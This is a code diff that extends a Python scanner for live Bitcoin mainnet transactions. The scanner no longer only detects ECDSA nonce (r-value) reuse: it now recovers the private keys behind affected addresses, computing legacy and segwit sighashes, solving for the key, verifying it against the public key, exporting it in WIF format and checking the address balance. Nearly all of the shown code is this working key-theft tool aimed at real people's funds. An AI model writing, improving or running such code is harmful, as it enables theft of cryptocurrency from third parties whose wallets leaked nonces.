@@ -1,8 +1,11 @@
 #!/usr/bin/env python3
 """
 Scan Bitcoin Mainnet blocks and mempool for ECDSA nonce reuse (r-value reuse)
-vulnerabilities. Extracts DER-encoded signatures from P2PKH/P2WPKH inputs and
-flags addresses where the same 'r' value appears in multiple signatures.
+vulnerabilities with FULL PRIVATE KEY RECOVERY.
+
+Extracts DER-encoded signatures from P2PKH/P2WPKH/P2SH-P2WPKH inputs, computes
+the sighash (z value) for each input, detects r-value reuse, and recovers the
+private key when found.
 
 Uses the mempool.space API (no authentication required).
 """
@@ -11,6 +14,7 @@ import argparse
 import hashlib
 import json
 import logging
+import struct
 import sys
 import time
 from collections import defaultdict
@@ -39,6 +43,10 @@ logger = logging.getLogger(__name__)
 # ---------------------------------------------------------------------------
 # secp256k1 curve order
 N_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+# secp256k1 field prime
+FIELD_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
+
+SIGHASH_ALL = 0x01
 
 MEMPOOL_API_ENDPOINTS = [
     "https://mempool.space/api",
@@ -122,6 +130,222 @@ class MempoolAPIClient:
 
     def get_address_utxos(self, address: str) -> List[Dict]:
         return self._get(f"/address/{address}/utxo")
+
+    def get_tx_hex(self, txid: str) -> str:
+        """Get raw transaction hex."""
+        return self._get_text(f"/tx/{txid}/hex")
+
+
+# ---------------------------------------------------------------------------
+# Sighash Computation
+# ---------------------------------------------------------------------------
+def sha256d(data: bytes) -> bytes:
+    """Double SHA-256."""
+    return hashlib.sha256(hashlib.sha256(data).digest()).digest()
+
+
+def hash160(data: bytes) -> bytes:
+    """RIPEMD160(SHA256(data))."""
+    sha = hashlib.sha256(data).digest()
+    try:
+        return hashlib.new("ripemd160", sha).digest()
+    except (ValueError, TypeError):
+        # OpenSSL 3.0+ may not support ripemd160; fall back to pycryptodome
+        from Crypto.Hash import RIPEMD160
+        return RIPEMD160.new(sha).digest()
+
+
+def encode_varint(value: int) -> bytes:
+    if value < 0xFD:
+        return struct.pack("<B", value)
+    if value <= 0xFFFF:
+        return b"\xfd" + struct.pack("<H", value)
+    if value <= 0xFFFFFFFF:
+        return b"\xfe" + struct.pack("<I", value)
+    return b"\xff" + struct.pack("<Q", value)
+
+
+def legacy_sighash(tx: Dict, input_index: int, subscript_hex: str, sighash_type: int = SIGHASH_ALL) -> int:
+    """Compute legacy (pre-segwit) sighash for a P2PKH input.
+
+    Serializes the transaction with the subscript (prevout scriptPubKey) placed
+    in the signing input and empty scripts for all other inputs, appends the
+    4-byte sighash type, and double-SHA256s the result.
+
+    Uses mempool.space tx format:
+      vin[i].txid, vin[i].vout, vin[i].sequence, vin[i].prevout.scriptpubkey
+      vout[i].scriptpubkey, vout[i].value (satoshis)
+    """
+    subscript = bytes.fromhex(subscript_hex)
+    version = struct.pack("<I", tx.get("version", 1))
+
+    vin_list = tx["vin"]
+    serialized_inputs = bytearray(encode_varint(len(vin_list)))
+    for idx, vin in enumerate(vin_list):
+        prev_txid = bytes.fromhex(vin["txid"])[::-1]
+        prev_vout = struct.pack("<I", vin["vout"])
+        if idx == input_index:
+            script = subscript
+        else:
+            script = b""
+        script_len = encode_varint(len(script))
+        sequence = struct.pack("<I", vin.get("sequence", 0xFFFFFFFF))
+        serialized_inputs += prev_txid + prev_vout + script_len + script + sequence
+
+    vout_list = tx["vout"]
+    serialized_outputs = bytearray(encode_varint(len(vout_list)))
+    for vout in vout_list:
+        amount = struct.pack("<Q", vout["value"])
+        script = bytes.fromhex(vout["scriptpubkey"])
+        serialized_outputs += amount + encode_varint(len(script)) + script
+
+    locktime = struct.pack("<I", tx.get("locktime", 0))
+    hash_type = struct.pack("<I", sighash_type)
+
+    preimage = version + bytes(serialized_inputs) + bytes(serialized_outputs) + locktime + hash_type
+    digest = sha256d(preimage)
+    return int.from_bytes(digest, "big")
+
+
+def bip143_sighash(
+    tx: Dict, input_index: int, script_code: bytes, amount_sat: int, sighash_type: int = SIGHASH_ALL
+) -> int:
+    """Compute BIP143 (segwit v0) sighash for P2WPKH or P2SH-P2WPKH inputs.
+
+    Uses mempool.space tx format.
+    """
+    version = struct.pack("<I", tx.get("version", 1))
+
+    # hashPrevouts
+    prevouts = b"".join(
+        bytes.fromhex(vin["txid"])[::-1] + struct.pack("<I", vin["vout"])
+        for vin in tx["vin"]
+    )
+    hash_prevouts = sha256d(prevouts)
+
+    # hashSequence
+    sequences = b"".join(
+        struct.pack("<I", vin.get("sequence", 0xFFFFFFFF)) for vin in tx["vin"]
+    )
+    hash_sequence = sha256d(sequences)
+
+    # hashOutputs
+    outputs = b"".join(
+        struct.pack("<Q", vout["value"])
+        + encode_varint(len(bytes.fromhex(vout["scriptpubkey"])))
+        + bytes.fromhex(vout["scriptpubkey"])
+        for vout in tx["vout"]
+    )
+    hash_outputs = sha256d(outputs)
+
+    vin = tx["vin"][input_index]
+    outpoint = bytes.fromhex(vin["txid"])[::-1] + struct.pack("<I", vin["vout"])
+    script_code_serialized = encode_varint(len(script_code)) + script_code
+    amount = struct.pack("<Q", amount_sat)
+    sequence = struct.pack("<I", vin.get("sequence", 0xFFFFFFFF))
+    locktime = struct.pack("<I", tx.get("locktime", 0))
+    hash_type = struct.pack("<I", sighash_type)
+
+    preimage = (
+        version
+        + hash_prevouts
+        + hash_sequence
+        + outpoint
+        + script_code_serialized
+        + amount
+        + sequence
+        + hash_outputs
+        + locktime
+        + hash_type
+    )
+    digest = sha256d(preimage)
+    return int.from_bytes(digest, "big")
+
+
+def build_p2wpkh_script_code(pubkey_hex: str) -> bytes:
+    """Build the script code for P2WPKH BIP143 sighash: OP_DUP OP_HASH160 <hash> OP_EQUALVERIFY OP_CHECKSIG."""
+    pubkey_bytes = bytes.fromhex(pubkey_hex)
+    key_hash = hash160(pubkey_bytes)
+    return b"\x76\xa9\x14" + key_hash + b"\x88\xac"
+
+
+def compute_sighash_for_input(tx: Dict, vin_idx: int, pubkey_hex: Optional[str] = None) -> Optional[int]:
+    """Compute the sighash (z value) for a transaction input.
+
+    Handles P2PKH (legacy), P2WPKH (native segwit), and P2SH-P2WPKH (wrapped segwit).
+    """
+    vin = tx["vin"][vin_idx]
+    prevout = vin.get("prevout", {})
+    script_type = prevout.get("scriptpubkey_type", "")
+    prevout_script = prevout.get("scriptpubkey", "")
+    amount_sat = prevout.get("value", 0)
+
+    try:
+        if script_type == "p2pkh":
+            # Legacy sighash: use the prevout scriptPubKey as subscript
+            return legacy_sighash(tx, vin_idx, prevout_script, SIGHASH_ALL)
+
+        elif script_type == "v0_p2wpkh":
+            # Native SegWit P2WPKH: BIP143 sighash
+            if not pubkey_hex:
+                return None
+            script_code = build_p2wpkh_script_code(pubkey_hex)
+            return bip143_sighash(tx, vin_idx, script_code, amount_sat, SIGHASH_ALL)
+
+        elif script_type == "p2sh":
+            # Could be P2SH-P2WPKH (wrapped segwit)
+            witness = vin.get("witness", [])
+            if witness and pubkey_hex:
+                # P2SH-P2WPKH: use BIP143 with the inner P2WPKH script code
+                script_code = build_p2wpkh_script_code(pubkey_hex)
+                return bip143_sighash(tx, vin_idx, script_code, amount_sat, SIGHASH_ALL)
+            else:
+                # Plain P2SH (multisig etc) — skip for now
+                return None
+
+        elif script_type == "v0_p2wsh":
+            # P2WSH: would need the witness script, skip for now
+            return None
+
+    except Exception:
+        return None
+
+    return None
+
+
+# ---------------------------------------------------------------------------
+# Public Key / Address Utilities
+# ---------------------------------------------------------------------------
+def pubkey_to_p2pkh_address(pubkey_hex: str) -> str:
+    """Convert a compressed/uncompressed public key to a P2PKH address."""
+    pubkey_bytes = bytes.fromhex(pubkey_hex)
+    key_hash = hash160(pubkey_bytes)
+    versioned = b"\x00" + key_hash
+    checksum = sha256d(versioned)[:4]
+    import base58
+    return base58.b58encode(versioned + checksum).decode()
+
+
+def verify_recovered_key(private_key_int: int, pubkey_hex: str) -> bool:
+    """Verify that a recovered private key corresponds to the expected public key."""
+    try:
+        from ecdsa import SECP256k1
+        G = SECP256k1.generator
+        point = private_key_int * G
+        x = point.x()
+        y = point.y()
+        # Check compressed pubkey
+        prefix = b"\x02" if y % 2 == 0 else b"\x03"
+        computed_compressed = (prefix + x.to_bytes(32, "big")).hex()
+        if computed_compressed == pubkey_hex:
+            return True
+        # Check uncompressed
+        computed_uncompressed = (b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")).hex()
+        if computed_uncompressed == pubkey_hex:
+            return True
+        return False
+    except Exception:
+        return False
 
 
 # ---------------------------------------------------------------------------
@@ -270,10 +494,14 @@ def extract_signatures_from_witness(witness: List[str]) -> List[Dict[str, Any]]:
 
 
 # ---------------------------------------------------------------------------
-# Transaction Signature Extraction
+# Transaction Signature Extraction (with sighash computation)
 # ---------------------------------------------------------------------------
-def extract_all_signatures(tx: Dict) -> List[Dict[str, Any]]:
-    """Extract all ECDSA signatures from a transaction's inputs."""
+def extract_all_signatures(tx: Dict, compute_z: bool = True) -> List[Dict[str, Any]]:
+    """Extract all ECDSA signatures from a transaction's inputs.
+
+    When compute_z=True, also computes the sighash (z value) for each input,
+    enabling full private key recovery when r-value reuse is detected.
+    """
     results = []
     txid = tx.get("txid", "unknown")
 
@@ -301,6 +529,15 @@ def extract_all_signatures(tx: Dict) -> List[Dict[str, Any]]:
             sig["vin_index"] = vin_idx
             sig["address"] = address
             sig["script_type"] = script_type
+
+            # Compute sighash (z value) for full recovery capability
+            if compute_z:
+                pubkey_hex = sig.get("pubkey")
+                z = compute_sighash_for_input(tx, vin_idx, pubkey_hex)
+                sig["z"] = z
+            else:
+                sig["z"] = None
+
             results.append(sig)
 
     return results
@@ -367,12 +604,15 @@ def find_r_reuse_global(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]
 # ---------------------------------------------------------------------------
 # Private Key Recovery
 # ---------------------------------------------------------------------------
-def recover_private_key(sig1: Dict, sig2: Dict) -> Optional[Dict[str, str]]:
+def recover_private_key(sig1: Dict, sig2: Dict) -> Optional[Dict[str, Any]]:
     """Recover private key from two signatures with the same r value.
 
-    Given two signatures (r, s1, z1) and (r, s2, z2) with the same k:
+    Given two signatures (r, s1, z1) and (r, s2, z2) with the same nonce k:
         k = (z1 - z2) / (s1 - s2) mod n
         d = (s1*k - z1) / r mod n
+
+    Also tries the low-s variant: if one s was normalized to n-s, we try
+    both (s1 - s2) and (s1 + s2) as denominators.
     """
     try:
         r = sig1["r_int"]
@@ -385,37 +625,57 @@ def recover_private_key(sig1: Dict, sig2: Dict) -> Optional[Dict[str, str]]:
         if z1 == z2 and s1 == s2:
             return None  # identical signatures, no info gain
 
-        numerator = (z1 - z2) % N_ORDER
-        denominator = (s1 - s2) % N_ORDER
-        if denominator == 0:
-            # Try with -s2 (low-s normalization)
-            denominator = (s1 + s2) % N_ORDER
+        pubkey_hex = sig1.get("pubkey") or sig2.get("pubkey")
+
+        # Try multiple formulations to handle low-s normalization
+        candidates = []
+
+        for s2_trial in (s2, N_ORDER - s2):
+            numerator = (z1 - z2) % N_ORDER
+            denominator = (s1 - s2_trial) % N_ORDER
             if denominator == 0:
-                return None
+                continue
 
-        k = (numerator * pow(denominator, -1, N_ORDER)) % N_ORDER
-        r_inv = pow(r, -1, N_ORDER)
-        private_key = ((s1 * k - z1) * r_inv) % N_ORDER
+            k = (numerator * pow(denominator, -1, N_ORDER)) % N_ORDER
+            r_inv = pow(r, -1, N_ORDER)
 
-        # Verify with second signature
-        private_key_check = ((s2 * k - z2) * r_inv) % N_ORDER
-        if private_key != private_key_check:
-            # Try negative k
-            k = N_ORDER - k
+            # d = (s*k - z) / r mod n
             private_key = ((s1 * k - z1) * r_inv) % N_ORDER
-            private_key_check = ((s2 * k - z2) * r_inv) % N_ORDER
-            if private_key != private_key_check:
-                return None
+            if 0 < private_key < N_ORDER:
+                candidates.append((private_key, k))
 
-        if private_key == 0 or private_key >= N_ORDER:
-            return None
+            # Try with negated k
+            k_neg = N_ORDER - k
+            private_key2 = ((s1 * k_neg - z1) * r_inv) % N_ORDER
+            if 0 < private_key2 < N_ORDER:
+                candidates.append((private_key2, k_neg))
 
-        return {
-            "private_key_hex": hex(private_key)[2:].zfill(64),
-            "private_key_int": str(private_key),
-            "k_hex": hex(k)[2:].zfill(64),
-        }
-    except (ValueError, ZeroDivisionError):
+        # Verify each candidate against the pubkey
+        for private_key, k in candidates:
+            if pubkey_hex and verify_recovered_key(private_key, pubkey_hex):
+                return {
+                    "private_key_hex": hex(private_key)[2:].zfill(64),
+                    "private_key_int": str(private_key),
+                    "k_hex": hex(k)[2:].zfill(64),
+                    "verified": True,
+                }
+
+        # If no pubkey to verify against, return first candidate with cross-check
+        if not pubkey_hex and candidates:
+            private_key, k = candidates[0]
+            # Cross-verify: does d work for both signatures?
+            check_z2 = (k * s2 - r * private_key) % N_ORDER
+            # s2 = k^-1 * (z2 + r*d) => z2 = s2*k - r*d
+            if check_z2 == z2 % N_ORDER:
+                return {
+                    "private_key_hex": hex(private_key)[2:].zfill(64),
+                    "private_key_int": str(private_key),
+                    "k_hex": hex(k)[2:].zfill(64),
+                    "verified": False,
+                }
+
+        return None
+    except (ValueError, ZeroDivisionError, TypeError):
         return None
 
 
@@ -563,14 +823,25 @@ def _analyze_and_report(
         except Exception:
             finding["balance_btc"] = None
 
-        # Attempt private key recovery (requires z values which we may not have
-        # from just the API — would need raw transaction sighash computation)
+        # Attempt private key recovery using computed z values
         sigs = finding["signatures"]
-        if len(sigs) >= 2 and sigs[0].get("z") and sigs[1].get("z"):
-            pk_data = recover_private_key(sigs[0], sigs[1])
-            if pk_data:
-                finding["private_key"] = pk_data
-                logger.critical(f"  PRIVATE KEY RECOVERED for {address}!")
+        pk_recovered = False
+        for i in range(len(sigs)):
+            if pk_recovered:
+                break
+            for j in range(i + 1, len(sigs)):
+                if sigs[i].get("z") and sigs[j].get("z"):
+                    pk_data = recover_private_key(sigs[i], sigs[j])
+                    if pk_data:
+                        finding["private_key"] = pk_data
+                        finding["wif"] = private_key_to_wif(pk_data["private_key_hex"])
+                        verified = pk_data.get("verified", False)
+                        logger.critical(
+                            f"  PRIVATE KEY RECOVERED for {address}! "
+                            f"(verified={verified}) WIF={finding['wif']}"
+                        )
+                        pk_recovered = True
+                        break
 
         results["r_reuse_by_address"].append(finding)
 
